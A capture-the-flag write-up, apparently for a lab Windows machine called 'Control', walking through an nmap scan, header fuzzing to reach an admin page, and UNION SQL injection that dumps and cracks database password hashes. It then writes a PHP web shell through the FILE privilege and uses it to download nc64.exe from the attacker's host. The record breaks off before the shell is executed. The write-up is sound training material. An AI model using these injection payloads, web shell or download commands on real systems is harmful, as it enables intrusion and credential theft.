---
icon: windows
---

# Control - Hard

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```bash
## Nmap TCP
nmap -A -T4 -Pn -p- 10.129.78.10 -oN scans/nmap-tcpall
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-25 09:00 -0400
Nmap scan report for 10.129.78.10
Host is up (0.028s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Fidelity
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc   Microsoft Windows RPC
3306/tcp  open  mysql   MariaDB 10.3.24 or later (unauthorized)
49666/tcp open  msrpc   Microsoft Windows RPC
49667/tcp open  msrpc   Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Microsoft Windows Server 2019 (97%), Microsoft Windows 10 1903 - 22H2 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 135/tcp)
HOP RTT      ADDRESS
1   24.87 ms 10.10.14.1
2   28.76 ms 10.129.78.10

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 162.77 seconds

```

### <mark style="color:$primary;">MSSQL - TCP 3306</mark>

* tried connecting, but my ip address is not allowed to connect

<figure><img src="../../.gitbook/assets/image (3433).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">HTTP Port 80 TCP</mark>

```shellscript
└─$ curl -I http://10.129.78.10/
HTTP/1.1 200 OK
Content-Length: 0
Content-Type: text/html; charset=UTF-8
Server: Microsoft-IIS/10.0
X-Powered-By: PHP/7.3.7
Date: Sun, 25 Oct 2026 13:32:06 GMT
```

<figure><img src="../../.gitbook/assets/image (3432).png" alt=""><figcaption></figcaption></figure>

* there is an admin link I am going to check it out

#### <mark style="color:yellow;">/admin.php</mark>

<figure><img src="../../.gitbook/assets/image (3434).png" alt=""><figcaption></figcaption></figure>

* if we can find the header we might be able to get access

#### <mark style="color:yellow;">"/" Root Page Source</mark>

At the top of the source for the web root found some comments

```shellscript
<!-- To Do:
			- Import Products
			- Link to new payment system
			- Enable SSL (Certificates location \\192.168.4.28\myfiles)
<!-- Header -->
```

#### <mark style="color:yellow;">Header Injection</mark>

* We can try Discovering it by fuzzing but based on the hint we got in the comments its most likely X-Forward something
* Run the below commands to get a list of headers

{% code overflow="wrap" %}
```shellscript
curl -sL "https://raw.githubusercontent.com/mdn/content/main/files/en-us/web/http/reference/headers/index.md" \
| grep -oE '\{\{HTTPHeader\("[^"]+"\)' \
| sed 's/.*("//; s/"$//' \
| sort -u > http-headers.txt
// Now run another command to  clean it up
sed -i 's/")$//' http-headers.txt
```
{% endcode %}

**Fuzzing**

```shellscript
wfuzz -u http://10.129.78.10/admin.php -w ./http-headers.txt -H "FUZZ: 192.168.4.28" --hw 15
```

<figure><img src="../../.gitbook/assets/image (3435).png" alt=""><figcaption></figcaption></figure>

We got a 200 ok on X-Forwarded-For, let's add it using the plugin Modify Header Value

<figure><img src="../../.gitbook/assets/image (3436).png" alt=""><figcaption></figcaption></figure>

#### <mark style="color:yellow;">/admin.php</mark>

<figure><img src="../../.gitbook/assets/image (3437).png" alt=""><figcaption></figcaption></figure>

* I am going to open Burp and try different actions see if I can uncover any SQLI&#x20;

#### <mark style="color:yellow;">SQLI in search\_products.php</mark>

```shellscript
POST /search_products.php HTTP/1.1
Host: 10.129.78.10
Content-Length: 34
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Origin: http://10.129.78.10
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.129.78.10/admin.php
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
x-forwarded-for: 192.168.4.28
Connection: keep-alive

productName=Panda'
```

When I added a `'` I got an error in the response &#x20;

{% code overflow="wrap" %}
```html
<table border="1" cellpadding="10">
						<thead>
							<tr>
								<th>Id</th>
								<th>Name</th>
								<th>Quantity</th>
								<th>Category</th>
								<th>Price</th>
							</tr>
						</thead>
						<tbody>
							Error: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''Panda''' at line 1						</tbody>
					</table>
```
{% endcode %}

I can fix the query by adding a `#` as follows `productName=Panda'#` which returns a \<tbody> of:

```html
<td>No Products Found</td><td> </td><td> </td><td> </td><td> </td>
```

* I'll use union injection to figure out the number of columns

`productName=Panda' union select 1#`

* with this we get the following error

{% code overflow="wrap" %}
```bash
Error: SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns
```
{% endcode %}

Developer made a mistake by allowing the error messages to display. I'll continue adding columns to my select until I get to `productName=Panda' UNION select 1,2,3,4,5,6#` which returns

{% code overflow="wrap" %}
```html
<tr><td>1</td><td>2</td><td>3</td><td>4</td><td>5</td><td>6</td></tr>
```
{% endcode %}

* now we can start extracting information from the DB

{% code overflow="wrap" %}
```shellscript
productName=Panda' UNION select 1,@@version,user(),database(),5,6#
```
{% endcode %}

* this will return the version, current user, & current database

{% code overflow="wrap" %}
```html
<tr><td>1</td><td>10.4.8-MariaDB</td><td>manager@localhost</td><td>warehouse</td><td>5</td><td>6</td></tr>
```
{% endcode %}

* let's see the Databases

{% code overflow="wrap" %}
```shellscript
productName=Panda' union select schema_name,2,3,4,5,6 from information_schema.schemata#
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (3438).png" alt=""><figcaption></figcaption></figure>

* 2 are default Databases, warehouse is the only non-default. I'll take a look at the tables.

{% code overflow="wrap" %}
```shellscript
productName=Panda' union select table_schema,table_name,3,4,5,6 from information_schema.tables where table_schema != 'mysql' AND table_schema != 'information_schema'#
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (3439).png" alt=""><figcaption></figcaption></figure>

Nothing really interesting, we can grab the internal password hashes using ->

{% code overflow="wrap" %}
```shellscript
productName=Panda' UNION select host,user,password,4,5,6 from mysql.user#
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (3440).png" alt=""><figcaption></figcaption></figure>

* Crackstation reveals 2 passwords, I'll keep them for later

<figure><img src="../../.gitbook/assets/image (3441).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```shellscript
hector: l33th4x0rhector
manager: l3tm3!n
```
{% endcode %}

* I am gonig to take a look at the privileges for users

{% code overflow="wrap" %}
```shellscript
productName=Panda' union select grantee,privilege_type,is_grantable,4,5,6 from information_schema.user_privileges#
```
{% endcode %}

{% code overflow="wrap" %}
```shellscript
<td>'manager'@'localhost'</td><td>FILE</td><td>NO</td><td>4</td><td>5</td><td>6</td>
```
{% endcode %}

* our user has one privilege over FILE, cannot grant it to anyone but he does have that privilege.
* We can use the FILE privilege to write a webshell on the box
* Ill guess the default IIS path to be `c:/intepub/wwwroot/rev.php` I'll place my shell there

{% code overflow="wrap" %}
```shellscript
productName=Panda' union select '<?php system($_GET[\'cmd\']); ?>',2,3,4,5,6 into outfile 'c:/inetpub/wwwroot/deimos.php'#
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (3442).png" alt=""><figcaption></figcaption></figure>

* saying the request this way it errors out. But if I send the same request again it returns a message to me that it already exists

<figure><img src="../../.gitbook/assets/image (3443).png" alt=""><figcaption></figcaption></figure>

* let's test it out and see if we have command execution.

{% code overflow="wrap" %}
```shellscript
curl http://10.129.78.10/deimos.php?cmd=whoami
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (3444).png" alt=""><figcaption></figcaption></figure>

* I'll upload nc.exe on the target machine via a python web server to get a shell

{% code overflow="wrap" %}
```shellscript
curl http://10.129.78.10/deimos.php?cmd=powershell+wget+http://10.10.14.176/nc64.exe+-outfile+\windows\temp\nc64.exe
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (3445).png" alt=""><figcaption></figcaption></figure>

* Now ill execute nc&#x20;
